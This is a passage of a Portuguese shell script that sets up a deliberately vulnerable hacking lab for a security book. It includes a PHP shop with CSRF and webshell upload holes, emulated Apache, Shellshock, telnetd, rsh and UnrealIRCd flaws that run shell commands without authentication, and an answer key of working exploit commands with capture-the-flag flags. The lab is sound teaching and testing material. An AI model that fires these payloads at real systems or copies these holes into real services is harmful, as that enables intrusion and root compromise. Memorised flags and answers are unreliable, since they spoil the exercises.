    echo '<p><b>' . htmlspecialchars($c['autor']) . '</b> <span class="aviso">' . $c['criado_em'] . '</span><br>' . $c['corpo'] . '</p>';
}
?>
<form method="post" action="/comentar.php">
  <input type="hidden" name="produto_id" value="<?= (int)$p['id'] ?>">
  <p>Autor: <input name="autor" value="anon"></p>
  <p><textarea name="corpo" rows="3" cols="50" placeholder="deixe seu comentário"></textarea></p>
  <button>Comentar</button>
</form>
<?php corvo_rodape();
CORVO_EOF
  cat > "$C/robots.txt" <<'CORVO_EOF'
User-agent: *
Disallow: /admin/
Disallow: /privado/
Disallow: /uploads/
Disallow: /config.php.bak
CORVO_EOF
  cat > "$C/transferir.php" <<'CORVO_EOF'
<?php
require_once __DIR__ . '/_db.php';
require_once __DIR__ . '/_layout.php';
$db = corvo_db();
$u = corvo_usuario_atual();

corvo_topo('Transferir pontos');
if (!$u) { echo '<p>Você precisa <a href="/login.php">entrar</a>.</p>'; corvo_rodape(); exit; }

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // ⚠️ FALHA: ação que muda estado SEM token anti-CSRF (CWE-352).
    // Qualquer página externa consegue disparar esta transferência no navegador da vítima.
    $para = trim($_POST['para'] ?? '');
    $valor = (int)($_POST['valor'] ?? 0);
    $destino = $db->query("SELECT id FROM usuarios WHERE usuario='" . $para . "'")->fetchColumn();
    if ($destino && $valor > 0) {
        $db->exec('UPDATE usuarios SET saldo=saldo-' . $valor . ' WHERE id=' . (int)$u['id']);
        $db->exec('UPDATE usuarios SET saldo=saldo+' . $valor . ' WHERE id=' . (int)$destino);
        echo '<p>Transferidos ' . $valor . ' pontos para ' . htmlspecialchars($para) . '.</p>';
        echo '<p class="flag">Transferência aceita sem token: FLAG{csrf_transferencia}</p>';
    } else {
        echo '<p style="color:#ff6633">Destino inválido ou valor zero.</p>';
    }
}
?>
<form method="post">
  <p>Para (usuário): <input name="para" value="admin"></p>
  <p>Valor: <input name="valor" value="10" size="5"></p>
  <button>Transferir</button>
</form>
<p class="aviso">Repare: o formulário não tem campo de token. É esse o alvo do capítulo de CSRF.</p>
<?php corvo_rodape();
CORVO_EOF
  cat > "$C/upload.php" <<'CORVO_EOF'
<?php
require_once __DIR__ . '/_layout.php';
require_once __DIR__ . '/config.php';
corvo_topo('Enviar arquivo');
echo '<h1>Enviar comprovante</h1>';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_FILES['arquivo']['name'])) {
    // ⚠️ FALHA: aceita QUALQUER arquivo, mantém a extensão e salva na raiz web
    // (unrestricted file upload → RCE, CWE-434). Enviar um .php vira webshell:
    // /uploads/shell.php?c=cat+../privado/flag_rce.txt  (o shell roda com CWD em /uploads)
    $nome = basename($_FILES['arquivo']['name']);
    $destino = CORVO_UPLOADS . '/' . $nome;
    if (move_uploaded_file($_FILES['arquivo']['tmp_name'], $destino)) {
        $url = '/uploads/' . rawurlencode($nome);
        echo '<p>Arquivo salvo em <a href="' . $url . '">' . htmlspecialchars($url) . '</a>.</p>';
    } else {
        echo '<p style="color:#ff6633">Falha ao salvar.</p>';
    }
}
?>
<form method="post" enctype="multipart/form-data">
  <input type="file" name="arquivo">
  <button>Enviar</button>
</form>
<p class="aviso">Aceita imagens do comprovante. (Na prática, aceita qualquer coisa.)</p>
<?php corvo_rodape();
CORVO_EOF
  cat > "$C/uploads/LEIA.txt" <<'CORVO_EOF'
Este diretório guarda os uploads dos usuarios.
CORVO_EOF
  cat > "$C/verbo.php" <<'CORVO_EOF'
<?php
require_once __DIR__ . '/_layout.php';
// Endpoint de "cupom" com controle por MÉTODO mal feito (HTTP verb tampering, CWE-650).
// A regra só barra GET; qualquer outro método (POST, PUT, HEAD…) libera o cupom.
// No Burp: mande a requisição ao Repeater e troque o verbo — o cupom cai.
$metodo = $_SERVER['REQUEST_METHOD'];
corvo_topo('Cupom');
echo '<h1>Cupom do dia</h1>';
if ($metodo === 'GET') {
    echo '<p>O cupom de hoje está indisponível para consulta simples.</p>';
    echo '<p class="aviso">(dica: o servidor só bloqueia o método GET)</p>';
} else {
    echo '<p class="flag">Cupom liberado via ' . htmlspecialchars($metodo) . ': FLAG{verb_tampering_cupom}</p>';
}
corvo_rodape();
CORVO_EOF

  # dono = user (uid 1000); uploads e o banco precisam ser gravaveis por ele
  chown -R user:user "$C"
  chmod 0775 "$C/uploads"
  # semeia o banco ja como user (dono correto do db.sqlite)
  sudo -u user php "$C/seed.php" >/dev/null 2>&1 || true

  # serviço: servidor embutido do PHP em 0.0.0.0:8090, como user
  cat > /etc/systemd/system/corvo.service <<'CORVO_EOF'
[Unit]
Description=Corvo — loja web vulneravel (livro Burp para Hackers)
After=network.target

[Service]
Type=simple
User=user
WorkingDirectory=/opt/corvo
ExecStart=/usr/bin/php -S 0.0.0.0:8090 -t /opt/corvo
Restart=on-failure

[Install]
WantedBy=multi-user.target
CORVO_EOF
  systemctl daemon-reload 2>/dev/null || true
  svc corvo

  gab "## corvo (8090) — loja web vulneravel (livro Burp para Hackers)"
  gab "- Alvo do livro; ataque conduzido pelo Burp Suite. Home: http://<ip>:8090/"
  gab "- SQLi login:  usuario = admin'--  (bypass)  -> FLAG{sqli_login_bypass_admin}"
  gab "- LFI:  /pagina.php?arquivo=../privado/flag_lfi.txt  -> FLAG{lfi_path_traversal}"
  gab "- Upload->RCE:  envie shell.php; /uploads/shell.php?c=cat+../privado/flag_rce.txt"
  gab "- Cmd injection:  /ping.php?host=127.0.0.1;cat+privado/flag_cmd.txt"
  gab "- Flags FIXAS (nao rotacionam) — casam com o GABARITO.md do livro."
}

mod_apachecve() {
  info "== apachecve: Apache 2.4.49 legado emulado (path traversal/RCE, fonte, DoS) na porta 8081 =="
  apt_install python3
  # VULN (reproducao/emulacao): tres CVEs reais do Apache HTTP Server que dependem de versoes
  # especificas (2.4.49/2.4.50 e 2.4.60/61). O Debian atual traz 2.4.62 (corrigido), entao um
  # mini-servidor Python REPRODUZ o comportamento e ANUNCIA um banner falso 'Apache/2.4.49
  # (Debian)' — como o ftpdos anuncia 'vsFTPd 2.3.2' — para o recon (nmap -sV) casar.
  #   - CVE-2021-41773/42013: path traversal (%2e) -> leitura de arquivo + RCE via /bin/sh
  #   - CVE-2024-40725:       divulgacao de codigo-fonte (pedido indireto devolve o .php cru)
  #   - CVE-2025-49630:       DoS (requisicao maliciosa dispara "assertion failure" -> processo cai)
  #   - CVE-2014-6271:        Shellshock (CGI bash executa comando escondido num header) — KEV
  mkdir -p /var/www/rh /opt/rh /usr/lib/cgi-bin
  printf '%s\n' "$FLAG_APACHECVE" > /opt/rh/flag.txt
  cat > /var/www/rh/config.php <<EOF
<?php
// Config do sistema interno de RH — jamais deveria ser servido como texto puro.
\$db_host = '127.0.0.1';
\$db_user = 'rh_app';
\$db_pass = '${FLAG_APACHESRC}';   // credencial do banco (vazada via CVE-2024-40725)
\$db_name = 'rh';
?>
EOF
  chown -R www-data:www-data /var/www/rh /opt/rh
  chmod 0640 /opt/rh/flag.txt
  cat > /usr/local/sbin/apachecve.py <<'PY'
#!/usr/bin/env python3
# apachecve.py — emula 3 CVEs do Apache HTTP Server no laboratorio (porta 8081).
# NAO e o Apache real: reproduz o COMPORTAMENTO das falhas e ANUNCIA um banner falso
# 'Apache/2.4.49 (Debian)' (como o ftpdos anuncia 'vsFTPd 2.3.2'), p/ o recon casar.
#   - CVE-2021-41773/42013: path traversal (%2e) -> leitura de arquivo + RCE via /bin/sh
#   - CVE-2024-40725:       divulgacao de codigo-fonte (pedido indireto devolve o .php cru)
#   - CVE-2025-49630:       DoS (requisicao maliciosa dispara "assertion failure")
import os, subprocess
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

CGI_ROOT="/usr/lib/cgi-bin"; APPDIR="/var/www/rh"; BANNER="Apache/2.4.49 (Debian)"

def decode(p):
    for enc in ("%2e","%2E","%%32%65","%25%32%65","%c0%ae"):   # 41773 (%2e) + 42013 (double)
        p=p.replace(enc,".")
    return p

class H(BaseHTTPRequestHandler):
    def version_string(self): return BANNER            # banner falso da versao vulneravel
    def log_message(self,*a): pass
    def _send(self,code,body,ctype="text/plain; charset=utf-8"):
        if isinstance(body,str): body=body.encode("utf-8","replace")
        self.send_response(code); self.send_header("Content-Type",ctype)
        self.send_header("Content-Length",str(len(body))); self.end_headers()
        try: self.wfile.write(body)
        except Exception: pass
    def _dos(self):
        # CVE-2025-49630: entrada maliciosa no backend HTTP/2 dispara assertion failure.
        if self.path.startswith("/proxy/") and self.headers.get("X-H2-Assert","")=="crash":
            os._exit(3)                                # crash; systemd (Restart) reergue
    def _shellshock(self):
        # CVE-2014-6271 (Shellshock): um "CGI" bash executa o comando escondido num header
        # que comeca com '() { :;};' (o ataque real e este curl -H exato).
        if not self.path.split("?",1)[0].startswith("/cgi-bin/status"): return False
        for hv in self.headers.values():
            if hv and hv.replace(" ","").startswith("(){:;};"):
                try: out=subprocess.run(["/bin/sh","-c",hv.split("};",1)[1]],capture_output=True,timeout=10).stdout
                except Exception as e: out=str(e).encode()
                self._send(200, b"Status: OK\n"+out); return True
        self._send(200, "CGI status: OK\n"); return True
    def do_GET(self):
        self._dos()
        if self._shellshock(): return
        raw=self.path.split("?",1)[0]; dec=decode(raw)
        if raw.startswith("/rh/config.php"):           # CVE-2024-40725 (divulgacao de fonte)
            if raw!="/rh/config.php":                  # pedido indireto -> vaza o fonte
                try: return self._send(200,open(os.path.join(APPDIR,"config.php"),"rb").read())
                except Exception: return self._send(404,"Not Found")
            return self._send(200,"Conectado ao banco de dados interno de RH.\n")
        if raw.startswith("/cgi-bin/") and ".." in dec:  # CVE-2021-41773 (leitura)
            tgt=os.path.normpath(os.path.join(CGI_ROOT,dec[len("/cgi-bin/"):]))
            try: return self._send(200,open(tgt,"rb").read())
            except Exception: return self._send(404,"Not Found")
        if raw in ("/","/index.html"):
            return self._send(200,"<h1>RH - Sistema Interno</h1>\n","text/html; charset=utf-8")
        return self._send(404,"Not Found")
    def do_POST(self):
        self._dos()
        raw=self.path.split("?",1)[0]; dec=decode(raw); d=dec.rstrip("/")
        n=int(self.headers.get("Content-Length","0") or 0)
        body=self.rfile.read(n) if n>0 else b""
        if raw.startswith("/cgi-bin/") and ".." in dec and (d.endswith("/sh") or d.endswith("/bash")):
            try: return self._send(200,subprocess.run(["/bin/sh"],input=body,capture_output=True,timeout=10).stdout)
            except Exception as e: return self._send(500,str(e))
        return self._send(404,"Not Found")

if __name__=="__main__":
    ThreadingHTTPServer(("0.0.0.0",8081),H).serve_forever()
PY
  chmod 0755 /usr/local/sbin/apachecve.py
  cat > /etc/systemd/system/apachecve.service <<'EOF'
[Unit]
Description=Lab Apache 2.4.49 legado emulado (CVE-2021-41773/42013, 2024-40725, 2025-49630)
After=network.target
[Service]
User=www-data
ExecStart=/usr/bin/python3 /usr/local/sbin/apachecve.py
Restart=on-failure
RestartSec=3
[Install]
WantedBy=multi-user.target
EOF
  systemctl daemon-reload 2>/dev/null || true
  svc apachecve
  gab "## apachecve (8081) — Apache 2.4.49 legado emulado"
  gab "- Recon:  nmap -sV -p8081 <ip>   ->  banner 'Apache/2.4.49 (Debian)' (versao vulneravel)."
  gab "- CVE-2021-41773/42013 (path traversal -> leitura de arquivo):"
  gab "    curl -s --path-as-is 'http://<ip>:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'   -> /etc/passwd"
  gab "- CVE-2021-41773/42013 (RCE via /bin/sh, POST):"
  gab "    curl -s --path-as-is 'http://<ip>:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' --data 'id; cat /opt/rh/flag.txt'"
  gab "    -> uid=33(www-data) + ${FLAG_APACHECVE}"
  gab "- CVE-2024-40725 (divulgacao de fonte):  curl 'http://<ip>:8081/rh/config.php%2e'   -> vaza ${FLAG_APACHESRC}"
  gab "- CVE-2025-49630 (DoS):  curl -s -H 'X-H2-Assert: crash' 'http://<ip>:8081/proxy/'   -> o servico cai (~3s p/ voltar)."
  gab "- CVE-2014-6271 (Shellshock, RCE via CGI bash — KEV):"
  gab "    curl -s -H 'User-Agent: () { :;}; echo; id; cat /opt/rh/flag.txt' http://<ip>:8081/cgi-bin/status"
  gab "    -> uid=33(www-data) + ${FLAG_APACHECVE}"
  gab "- Mitigacao real: atualizar o Apache (>=2.4.51 traversal; >=2.4.62 fonte; >=2.4.64 mod_ssl) e o bash (Shellshock)."; gab ""
}

mod_nginxcve() {
  info "== nginxcve: nginx 1.26.0 vulneravel REAL + CVE-2026-42533 (DoS) na porta 8084 =="
  # CVE-2026-42533 (jul/2026): falha de 15 anos no *script engine* do nginx. A montagem de
  # valores de diretiva em dois passos (LEN mede o buffer; VALUE preenche) NAO salva/restaura
  # o estado de captura PCRE (r->captures). Um `map` com regex reavaliado ENTRE os passos
  # sobrescreve a captura -> buffer dimensionado errado -> heap overflow -> worker cai (DoS;
  # RCE potencial). Afeta 0.9.6–1.31.2; corrigido em 1.30.4 (stable) / 1.31.3 (mainline).
  # Diferente do apachecve (que EMULA), aqui rodamos o BINARIO vulneravel de verdade: um
  # worker real cai por SIGSEGV e o master o respawna. Fonte vendorada em vendor/ (a build
  # vulneravel ainda esta disponivel hoje; congelada na imagem, fica imune a sumir amanha).
  local VER=1.26.0 PREFIX=/opt/nginx-vuln SRC=/usr/local/src TB="" BUILT=0
  mkdir -p "$SRC"
  if [ -f "$SELF_DIR/vendor/nginx-$VER.tar.gz" ]; then
    TB="$SELF_DIR/vendor/nginx-$VER.tar.gz"; info "usando fonte vendorada: $TB"
  elif curl -fsSL --max-time 90 -o "$SRC/nginx-$VER.tar.gz" "https://nginx.org/download/nginx-$VER.tar.gz"; then
    TB="$SRC/nginx-$VER.tar.gz"; info "fonte baixado de nginx.org"
  else
    warn "nginxcve: sem fonte (vendor/ ausente e download falhou) -> vou EMULAR"
  fi
  if [ -n "$TB" ]; then
    apt_try build-essential libpcre2-dev zlib1g-dev libssl-dev || true
    rm -rf "$SRC/nginx-$VER"; tar xzf "$TB" -C "$SRC"
    if ( cd "$SRC/nginx-$VER" \
         && ./configure --prefix="$PREFIX" --with-http_ssl_module --with-pcre >/dev/null 2>&1 \
         && make -j"$(nproc)" >/dev/null 2>&1 && make install >/dev/null 2>&1 ) \
       && [ -x "$PREFIX/sbin/nginx" ]; then
      BUILT=1; log "nginx $VER vulneravel compilado em $PREFIX"
    else
      warn "nginxcve: build falhou -> vou EMULAR (banner + crash)"
    fi
  fi

  if [ "$BUILT" = 1 ]; then
    # --- caminho REAL: config vulneravel + servico com master (root) e worker (nobody) ---
    mkdir -p "$PREFIX/conf" "$PREFIX/logs"
    id nobody >/dev/null 2>&1 || true
    # VULN: config que satisfaz as 4 condicoes do padrao explorável (CVE-2026-42533):
    #  1) FONTE DE CAPTURA: regex no `location ~` captura $cap
    #  2) CLOBBER: `map` com regex (~) que reavalia PCRE e sobrescreve r->captures
    #  3) SINK DE DOIS PASSOS: `return`/`add_header` referencia TANTO $cap QUANTO $clob
    #  4) ORDEM: a captura ($cap) e avaliada ANTES do map regex rodar
    # >>> AJUSTAR/VALIDAR NO LAB: a *forma* segue o padrao publicado, mas o gatilho exato que
    #     estoura o buffer nesta build depende de detalhes de heap. Confirme pelo error.log
    #     ("worker process NNNN exited on signal 11") e afine o header X-Probe abaixo se preciso.
    cat > "$PREFIX/conf/lab.conf" <<'EOF'
user nobody nogroup;
worker_processes 1;
error_log logs/error.log info;
pid logs/nginx.pid;
events { worker_connections 128; }
http {
    default_type text/plain;
    access_log off;

    # (2) map com regex: reavalia PCRE e sobrescreve o estado de captura entre os 2 passos
    map $http_x_probe $clob {
        ~^(?<probe>.+)$   $probe;
        default           "";
    }

    server {
        listen 8084 default_server;
        server_name _;

        location = / {
            return 200 "nginx 1.26.0 (CVE-2026-42533). Gatilho: GET /echo/<algo> + header X-Probe:<longo>\n";
        }

        # (1) fonte de captura no location + (3)(4) sink que usa $cap E $clob (map regex)
        location ~ ^/echo/(?<cap>.+)$ {
            add_header X-Cap "$cap";
            return 200 "cap=$cap clob=$clob\n";
        }
    }
}
EOF
    "$PREFIX/sbin/nginx" -t -c "$PREFIX/conf/lab.conf" >/dev/null 2>&1 || warn "nginxcve: nginx -t reclamou da config"
    cat > /etc/systemd/system/nginxcve.service <<EOF
[Unit]
Description=Lab nginx 1.26.0 vulneravel (CVE-2026-42533, script engine capture clobber) :8084
After=network.target
[Service]
Type=simple
ExecStart=$PREFIX/sbin/nginx -c $PREFIX/conf/lab.conf -g 'daemon off;'
Restart=on-failure
RestartSec=2
[Install]
WantedBy=multi-user.target
EOF
  else
    # --- caminho EMULADO (fallback, estilo apachecve): banner falso + crash do processo ---
    cat > /usr/local/sbin/nginxcve.py <<'PY'
#!/usr/bin/env python3
# nginxcve.py — EMULA a CVE-2026-42533 quando o binario real nao pode ser compilado.
# Anuncia 'Server: nginx/1.26.0' e, ao receber o gatilho de captura-clobber
# (GET /echo/... com header X-Probe longo), mata o processo (os._exit) — o systemd
# (Restart=on-failure) o reergue, imitando o master do nginx respawnando o worker morto.
import os
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
BANNER = "nginx/1.26.0"
class H(BaseHTTPRequestHandler):
    server_version = BANNER; sys_version = ""
    def version_string(self): return BANNER
    def log_message(self, *a): pass
    def _send(self, code, body):
        b = body.encode() if isinstance(body, str) else body
        self.send_response(code); self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(b))); self.end_headers()
        try: self.wfile.write(b)
        except Exception: pass
    def do_GET(self):
        path = self.path.split("?", 1)[0]
        probe = self.headers.get("X-Probe", "")
        if path.startswith("/echo/") and len(probe) >= 200:   # captura-clobber -> overflow
            os._exit(11)                                       # "worker exited on signal 11"
        if path.startswith("/echo/"):
            return self._send(200, f"cap={path[len('/echo/'):]} clob={probe}\n")
        return self._send(200, "nginx 1.26.0 (CVE-2026-42533). Gatilho: GET /echo/<algo> + header X-Probe:<longo>\n")
if __name__ == "__main__":
    ThreadingHTTPServer(("0.0.0.0", 8084), H).serve_forever()
PY
    chmod 0755 /usr/local/sbin/nginxcve.py
    cat > /etc/systemd/system/nginxcve.service <<'EOF'
[Unit]
Description=Lab nginx 1.26.0 vulneravel EMULADO (CVE-2026-42533) :8084
After=network.target
[Service]
User=www-data
ExecStart=/usr/bin/python3 /usr/local/sbin/nginxcve.py
Restart=on-failure
RestartSec=2
[Install]
WantedBy=multi-user.target
EOF
  fi

  systemctl daemon-reload 2>/dev/null || true
  svc nginxcve
  gab "## nginxcve (8084) — nginx 1.26.0 vulneravel (CVE-2026-42533)"
  gab "- Modo: $([ "$BUILT" = 1 ] && echo 'binario REAL compilado (/opt/nginx-vuln)' || echo 'EMULADO (fallback)')"
  gab "- Recon:  nmap -sV -p8084 <ip>   ->  Server: nginx/1.26.0 (faixa afetada 0.9.6-1.31.2)."
  gab "- Identificar a config vulneravel (scanner de terceiro): CVE-2026-42533-Config-Scanner"
  gab "    python3 nginx_capture_clobber_scan.py /opt/nginx-vuln/conf/lab.conf  -> aponta o padrao."
  gab "- DoS (captura-clobber -> worker cai; master respawna em ~2s):"
  gab "    curl -s -H \"X-Probe: \$(python3 -c 'print(\"A\"*4096)')\" 'http://<ip>:8084/echo/x'"
  gab "    -> conexao reset/empty reply; error.log: 'worker process NNNN exited on signal 11'."
  gab "    (REAL: AJUSTAR o tamanho/forma do X-Probe se o worker nao cair — depende do heap.)"
  gab "- Mitigacao real: atualizar (>=1.30.4 stable / >=1.31.3 mainline) ou trocar o map regex"
  gab "    por captura nomeada (workaround parcial). CVSS 9.2 (v4) / 8.1 (v3.1)."; gab ""
}

mod_rservices() {
  info "== rservices: rsh com confianca .rhosts (+ +) -> shell sem senha (514) =="
  apt_install python3
  add_user legacy legacy123
  echo '+ +' > /home/legacy/.rhosts; chown legacy:legacy /home/legacy/.rhosts; chmod 0644 /home/legacy/.rhosts
  printf '%s\n' "$FLAG_RSH" > /home/legacy/foothold.txt; chown legacy:legacy /home/legacy/foothold.txt
  # VULN: os "r-services" (rsh/rlogin/rexec) confiam em hosts listados no .rhosts. Um '+ +'
  # confia em QUALQUER host e usuario, sem senha. Emulamos o rshd (514, protocolo rsh) rodando
  # como 'legacy' (foothold nao-privilegiado); a bind na porta <1024 usa CAP_NET_BIND_SERVICE.
  cat > /usr/local/sbin/rshd.py <<'PY'
#!/usr/bin/env python3
# rshd emulado (porta 514): confia em qualquer origem e roda o comando recebido sem
# autenticacao, como o usuario do servico. Protocolo rsh: \0 luser\0 ruser\0 cmd\0
import socket, subprocess
def handle(c):
    buf=b''; c.settimeout(10)
    try:
        while buf.count(b'\0')<4 and len(buf)<4096:
            d=c.recv(1024)
            if not d: break
            buf+=d
    except Exception: pass
    parts=buf.split(b'\0')
    cmd=parts[3].decode('utf-8','replace') if len(parts)>3 else ''
    try: c.sendall(b'\0')                       # byte de sucesso do rsh
    except Exception: return
    try: out=subprocess.run(['/bin/sh','-c',cmd],capture_output=True,timeout=10).stdout
    except Exception as e: out=str(e).encode()
    try: c.sendall(out)
    except Exception: pass
    c.close()
srv=socket.socket(); srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
srv.bind(('0.0.0.0',514)); srv.listen(5)
while True:
    try: c,_=srv.accept(); handle(c)
    except Exception: pass
PY
  chmod 0755 /usr/local/sbin/rshd.py
  cat > /etc/systemd/system/rshd.service <<'EOF'
[Unit]
Description=Lab rshd legado (confianca .rhosts + +, sem auth)
After=network.target
[Service]
User=legacy
AmbientCapabilities=CAP_NET_BIND_SERVICE
ExecStart=/usr/bin/python3 /usr/local/sbin/rshd.py
Restart=on-failure
[Install]
WantedBy=multi-user.target
EOF
  systemctl daemon-reload 2>/dev/null || true
  svc rshd
  gab "## rservices (514) — confianca .rhosts '+ +', sem senha"
  gab "- Recon: nmap -sV -p512-514 <ip> (exec/login/shell dos r-services)."
  gab "- Exploracao: rsh -l legacy <ip> 'id; cat ~/foothold.txt'  -> uid=legacy + ${FLAG_RSH}"
  gab "- Mecanismo (manual): protocolo rsh e '\\0luser\\0ruser\\0cmd\\0' na 514."
  gab "- Mitigacao: remover rsh/rlogin/rexec e usar SSH; jamais '.rhosts + +'."; gab ""
}

mod_telnetd() {
  info "== telnetd: CVE-2026-24061 (USER='-f root' -> login root sem senha) na porta 23 =="
  apt_install python3
  printf '%s\n' "$FLAG_TELNET" > /root/flag_telnet.txt; chmod 600 /root/flag_telnet.txt
  # VULN CVE-2026-24061 (2026, CISA KEV): o telnetd do GNU Inetutils (1.9.3-2.7) repassa o
  # nome de login / a variavel de ambiente USER ao `login` SEM sanitizar. Um valor "-f root"
  # vira o argumento `login -f root`, que forca a autenticacao como root SEM SENHA.
  # Emulamos o telnetd (estilo do rshd.py) — o binario autentico e o `inetutils-telnetd`, que
  # pode ser instalado no lugar quando se quer o binario real (ver [[lab-binario-real-vs-simular]]).
  cat > /usr/local/sbin/telnetd_sim.py <<'PY'
#!/usr/bin/env python3
# telnetd emulado (porta 23) reproduzindo a CVE-2026-24061: se o nome de login / USER for
# "-f root" (ou "-froot"), concede shell ROOT sem senha (login -f root). Estilo do rshd.py;
# a negociacao IAC do telnet e descartada, entao funciona com `telnet` e com `nc`.
import socket, subprocess, re
IAC = 0xff
def strip_iac(buf):
    out = bytearray(); i = 0
    while i < len(buf):
        b = buf[i]
        if b == IAC:
            if i+1 < len(buf) and buf[i+1] == 250:            # SB ... SE
                j = i+2
                while j+1 < len(buf) and not (buf[j] == IAC and buf[j+1] == 240): j += 1
                i = j+2; continue
            i += 3; continue                                   # IAC + verbo + opcao
        out.append(b); i += 1
    return bytes(out)
def read_line(c, buf):
    while b"\n" not in buf:
        try: d = c.recv(1024)
        except Exception: return None, b""
        if not d: return None, b""
        buf += d
    raw, buf = buf.split(b"\n", 1)
    return strip_iac(raw).decode("utf-8", "replace").strip("\r\0 "), buf
def handle(c):
    c.settimeout(20)
    try:
        c.sendall(bytes([IAC,251,1, IAC,251,3]))               # WILL ECHO / WILL SGA
        c.sendall(b"\r\nDebian GNU/Linux 12  (lab)  (GNU inetutils telnetd 2.5)\r\nlogin: ")
    except Exception: return
    user, buf = read_line(c, b"")
    if user is None: c.close(); return
    if re.fullmatch(r"-f\s*root|-froot", user):                # CVE-2026-24061: login -f root
        try: c.sendall(b"Last login: lab\r\nroot@lab:~# ")
        except Exception: pass
        while True:                                            # shell root
            cmd, buf = read_line(c, buf)
            if cmd is None or cmd in ("exit", "quit"): break
            try: out = subprocess.run(["/bin/sh","-c",cmd], capture_output=True, timeout=10).stdout
            except Exception as e: out = str(e).encode()
            try: c.sendall(out + b"\r\nroot@lab:~# ")
            except Exception: break
    else:
        try: c.sendall(b"Password: \r\nLogin incorrect\r\n")
        except Exception: pass
    c.close()
srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", 23)); srv.listen(5)
while True:
    try: c,_ = srv.accept(); handle(c)
    except Exception: pass
PY
  chmod 0755 /usr/local/sbin/telnetd_sim.py
  cat > /etc/systemd/system/telnetd-lab.service <<'EOF'
[Unit]
Description=Lab telnetd emulado (CVE-2026-24061, USER=-f root -> root sem senha) :23
After=network.target
[Service]
User=root
ExecStart=/usr/bin/python3 /usr/local/sbin/telnetd_sim.py
Restart=on-failure
RestartSec=2
[Install]
WantedBy=multi-user.target
EOF
  systemctl daemon-reload 2>/dev/null || true
  svc telnetd-lab
  gab "## telnetd (23) — CVE-2026-24061 (GNU Inetutils, USER='-f root'), CISA KEV"
  gab "- Recon:  nmap -sV -p23 <ip>   ->  telnetd (banner GNU inetutils)."
  gab "- Exploracao (login = '-f root', sem senha -> root):"
  gab "    telnet <ip>   ->  no 'login:' digite:  -froot   ->  shell root (# )"
  gab "    ou:  { printf '%s\\r\\n' '-froot' 'id; cat /root/flag_telnet.txt' 'exit'; } | nc -w6 <ip> 23"
  gab "    ->  uid=0(root) + ${FLAG_TELNET}"
  gab "- Emulado (estilo rshd). Binario real: inetutils-telnetd (mesma faixa 1.9.3-2.7)."
  gab "- Mitigacao: nao use telnet; se precisar, atualize o GNU Inetutils (>2.7) e prefira SSH."; gab ""
}

mod_unrealircd() {
  info "== unrealircd: backdoor de cadeia de suprimentos no IRC (6667) -> shell =="
  apt_install python3
  add_user ircd ircd123
  printf '%s\n' "$FLAG_IRC" > /home/ircd/flag.txt; chown ircd:ircd /home/ircd/flag.txt; chmod 0640 /home/ircd/flag.txt
  # VULN (reproducao): em 2010 o tarball do UnrealIRCd 3.2.8.1 foi adulterado com um backdoor
  # (CVE-2010-2075): qualquer dado iniciado por 'AB;' e executado como comando de shell. Emulamos
  # o gatilho num mini-IRC como 'ircd' (nao-privilegiado). O modulo Metasploit do backdoor usa o
  # mesmo prefixo 'AB;', entao a exploracao real (msf) tambem dispara aqui.
  cat > /usr/local/sbin/unrealircd.py <<'PY'
#!/usr/bin/env python3
# UnrealIRCd 3.2.8.1 backdoor emulado (6667, CVE-2010-2075): linha iniciada por 'AB;'
# roda como comando de shell. Anuncia um banner de IRC para o recon.
import socket, subprocess
BANNER=b':irc.lab NOTICE AUTH :*** Looking up your hostname...\r\n'
def handle(c):
    try: c.sendall(BANNER)
    except Exception: return
    buf=b''; c.settimeout(30)
    try:
        while True:
            d=c.recv(1024)
            if not d: break
            buf+=d
            while b'\n' in buf:
                line,buf=buf.split(b'\n',1)
                s=line.rstrip(b'\r').decode('utf-8','replace')
                if s.startswith('AB;'):                 # gatilho do backdoor
                    try: out=subprocess.run(['/bin/sh','-c',s[3:]],capture_output=True,timeout=10).stdout
                    except Exception as e: out=str(e).encode()
                    c.sendall(out)
    except Exception: pass
    c.close()
srv=socket.socket(); srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
srv.bind(('0.0.0.0',6667)); srv.listen(5)
while True:
    try: c,_=srv.accept(); handle(c)
    except Exception: pass
PY
  chmod 0755 /usr/local/sbin/unrealircd.py
  cat > /etc/systemd/system/unrealircd.service <<'EOF'
[Unit]
Description=Lab UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075)
After=network.target
[Service]
User=ircd
ExecStart=/usr/bin/python3 /usr/local/sbin/unrealircd.py
Restart=on-failure
[Install]
WantedBy=multi-user.target
EOF
  systemctl daemon-reload 2>/dev/null || true
  svc unrealircd
  gab "## unrealircd (6667) — backdoor CVE-2010-2075"
  gab "- Recon: nmap -sV -p6667 <ip> (servico IRC)."
  gab "- Backdoor: qualquer dado iniciado por 'AB;' roda como comando de shell."
  gab "- Exploracao (manual): printf 'AB;id; cat ~/flag.txt\\n' | nc <ip> 6667  -> ${FLAG_IRC}"
  gab "- Exploracao (arsenal): use exploit/unix/irc/unreal_ircd_3281_backdoor"
  gab "- Mitigacao: atualizar; verificar a assinatura/hash do fonte antes de compilar."; gab ""
}

mod_javarmi() {
  info "== javarmi: RMI registry REAL vulneravel a classloading remoto (1099) =="
  apt_install curl
  add_user rmisvc rmisvc123
  printf '%s\n' "$FLAG_RMI" > /home/rmisvc/flag.txt; chown rmisvc:rmisvc /home/rmisvc/flag.txt; chmod 0640 /home/rmisvc/flag.txt
  local JDK=/opt/jdk8 D=/opt/rmi
  if [ ! -x "$JDK/bin/java" ]; then
    info "baixando JDK 8 (Temurin) — pesado, aguarde..."
    curl -fsSL "https://api.adoptium.net/v3/binary/latest/8/ga/linux/x64/jdk/hotspot/normal/eclipse" -o /tmp/jdk8.tgz \
      || { warn "falha ao baixar JDK 8 — modulo javarmi abortado"; return; }
    mkdir -p "$JDK"; tar xzf /tmp/jdk8.tgz -C "$JDK" --strip-components=1 \
      || { warn "falha ao extrair JDK 8 — abortado"; return; }
  fi
  mkdir -p "$D"
